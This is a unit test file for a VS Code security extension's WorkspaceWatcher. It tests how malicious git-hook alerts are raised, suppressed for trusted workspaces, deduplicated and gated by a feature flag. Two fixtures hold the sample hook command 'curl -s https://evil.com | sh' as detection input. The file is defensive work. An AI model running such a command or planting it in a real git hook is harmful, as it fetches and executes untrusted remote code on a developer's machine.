/**
 * Unit tests for WorkspaceWatcher (git-hook static scan / trusted workspace)
 */

import { expect, use } from 'chai';
const sinon = require('sinon');
const sinonChai = require('sinon-chai');

use(sinonChai);
import * as vscode from 'vscode';
import { WorkspaceWatcher } from '../../monitor/analysis/workspace-watcher';
import { TrustedWorkspaceService } from '../../lib/services/trusted-workspace-service';
import { NotificationService } from '../../lib/services/notification-service';
import { IDEStatusService } from '../../lib/services/ide-status-service';
import { FsRuleType } from '../../detection/fs-rules';
import { Target } from '../../lib/events/ext-events';
import { SeverityLevel } from '../../lib/events/sec-events';
import type { HookScanMatch } from '../../monitor/analysis/hook-scanner';
import * as hookScanner from '../../monitor/analysis/hook-scanner';
import { GitHookAlertDedup } from '../../monitor/analysis/git-hook-alert-dedup';

function stubGitHookAdvisoryEnabled(enabled: boolean): sinon.SinonStub {
  return sinon.stub(vscode.workspace, 'getConfiguration').callsFake((section?: string) => {
    if (section === 'ide-shepherd.gitHookAdvisory') {
      return { get: sinon.stub().withArgs('enabled').returns(enabled) } as any;
    }
    return { get: sinon.stub().returns(undefined) } as any;
  });
}

suite('WorkspaceWatcher Tests', () => {
  suite('resolveWorkspacePathForFile', () => {
    let workspaceFoldersStub: sinon.SinonStub;

    setup(() => {
      workspaceFoldersStub = sinon.stub(vscode.workspace, 'workspaceFolders').value([
        { uri: { fsPath: '/home/user/project-a' }, name: 'project-a' },
        { uri: { fsPath: '/home/user/project-b' }, name: 'project-b' },
      ] as vscode.WorkspaceFolder[]);
    });

    teardown(() => {
      workspaceFoldersStub.restore();
    });

    test('should resolve workspace containing the hook file', () => {
      const resolved = WorkspaceWatcher.resolveWorkspacePathForFile('/home/user/project-b/.husky/pre-commit');
      expect(resolved).to.equal('/home/user/project-b');
    });

    test('should return undefined when file is outside all workspace roots', () => {
      expect(WorkspaceWatcher.resolveWorkspacePathForFile('/tmp/outside/pre-commit')).to.be.undefined;
    });
  });

  suite('triggerSecurityEvent — trusted workspace', () => {
    let isTrustedStub: sinon.SinonStub;
    let showAlertStub: sinon.SinonStub;
    let emitStub: sinon.SinonStub;
    let workspaceFoldersStub: sinon.SinonStub;

    const match: HookScanMatch = {
      filePath: '/home/user/project/.husky/pre-commit',
      content: 'curl -s https://evil.com | sh',
      rule: {
        id: 'write_git_hooks_malicious',
        name: 'Malicious Git Hooks Write',
        description: 'test',
        type: FsRuleType.WRITE,
        target: Target.FILESYSTEM,
        severity: SeverityLevel.HIGH,
        pathPattern: /.*/,
        contentPattern: /.*/,
        operations: ['write'],
        confidence: 1,
      },
    };

    setup(() => {
      GitHookAlertDedup.resetForTests();
      workspaceFoldersStub = sinon
        .stub(vscode.workspace, 'workspaceFolders')
        .value([{ uri: { fsPath: '/home/user/project' }, name: 'project' }] as vscode.WorkspaceFolder[]);
      sinon.stub(vscode.workspace, 'name').value('project');

      const mockTrusted = { isTrusted: sinon.stub() };
      isTrustedStub = mockTrusted.isTrusted;
      sinon.stub(TrustedWorkspaceService, 'getInstance').returns(mockTrusted as any);

      showAlertStub = sinon.stub(NotificationService, 'showMaliciousGitHookAlert').resolves();
      emitStub = sinon.stub(IDEStatusService, 'emitSecurityEvent').resolves();

      (WorkspaceWatcher as any).extensionMode = vscode.ExtensionMode.Production;
    });

    teardown(() => {
      GitHookAlertDedup.resetForTests();
      sinon.restore();
    });

    test('should not show git-hook modal when workspace is trusted', async () => {
      isTrustedStub.withArgs('/home/user/project').returns(true);

      await (WorkspaceWatcher as any).triggerSecurityEvent(match, true);

      expect(emitStub).to.have.been.calledOnce;
      expect(showAlertStub).to.not.have.been.called;
    });

    test('should show git-hook modal when workspace is not trusted', async () => {
      isTrustedStub.withArgs('/home/user/project').returns(false);

      await (WorkspaceWatcher as any).triggerSecurityEvent(match, true);

      expect(emitStub).to.have.been.calledOnce;
      expect(showAlertStub).to.have.been.calledOnce;
    });

    test('should not show duplicate git-hook modal for same file in session', async () => {
      isTrustedStub.withArgs('/home/user/project').returns(false);
      GitHookAlertDedup.suppress(match.filePath);

      await (WorkspaceWatcher as any).triggerSecurityEvent(match, true);

      expect(emitStub).to.have.been.calledOnce;
      expect(showAlertStub).to.not.have.been.called;
    });
  });

  suite('gitHookAdvisory.enabled feature flag', () => {
    let emitStub: sinon.SinonStub;
    let configStub: sinon.SinonStub;
    let scanStub: sinon.SinonStub;

    const match: HookScanMatch = {
      filePath: '/home/user/project/.husky/pre-commit',
      content: 'curl -s https://evil.com | sh',
      rule: {
        id: 'write_git_hooks_malicious',
        name: 'Malicious Git Hooks Write',
        description: 'test',
        type: FsRuleType.WRITE,
        target: Target.FILESYSTEM,
        severity: SeverityLevel.HIGH,
        pathPattern: /.*/,
        operations: ['write'],
        confidence: 1,
      },
    };

    setup(() => {
      emitStub = sinon.stub(IDEStatusService, 'emitSecurityEvent').resolves();
      sinon
        .stub(vscode.workspace, 'workspaceFolders')
        .value([{ uri: { fsPath: '/home/user/project' }, name: 'project' }] as vscode.WorkspaceFolder[]);
      scanStub = sinon.stub(hookScanner, 'scanWorkspaceRoot').returns([match]);
      (WorkspaceWatcher as any).extensionMode = vscode.ExtensionMode.Test;
    });

    teardown(() => {
      sinon.restore();
    });

    test('isGitHookAdvisoryEnabled should reflect settings (default false)', () => {
      configStub = stubGitHookAdvisoryEnabled(false);
      expect(WorkspaceWatcher.isGitHookAdvisoryEnabled()).to.be.false;
    });

    test('should not scan or emit when advisory is disabled', async () => {
      configStub = stubGitHookAdvisoryEnabled(false);

      await (WorkspaceWatcher as any).scanAllWorkspaceHooks(true);

      expect(scanStub).to.not.have.been.called;
      expect(emitStub).to.not.have.been.called;
    });

    test('should scan and emit when advisory is enabled', async () => {
      configStub = stubGitHookAdvisoryEnabled(true);
      sinon.stub(TrustedWorkspaceService, 'getInstance').returns({ isTrusted: sinon.stub().returns(false) } as any);

      await (WorkspaceWatcher as any).scanAllWorkspaceHooks(true);

      expect(scanStub).to.have.been.calledOnce;
      expect(emitStub).to.have.been.calledOnce;
    });

    test('activate should not register watchers when advisory is disabled', () => {
      configStub = stubGitHookAdvisoryEnabled(false);
      const watcherStub = sinon.stub(vscode.workspace, 'createFileSystemWatcher');
      const mockContext = { extensionMode: vscode.ExtensionMode.Production, subscriptions: [] } as any;

      WorkspaceWatcher.activate(mockContext);

      expect(watcherStub).to.not.have.been.called;
    });
  });
});
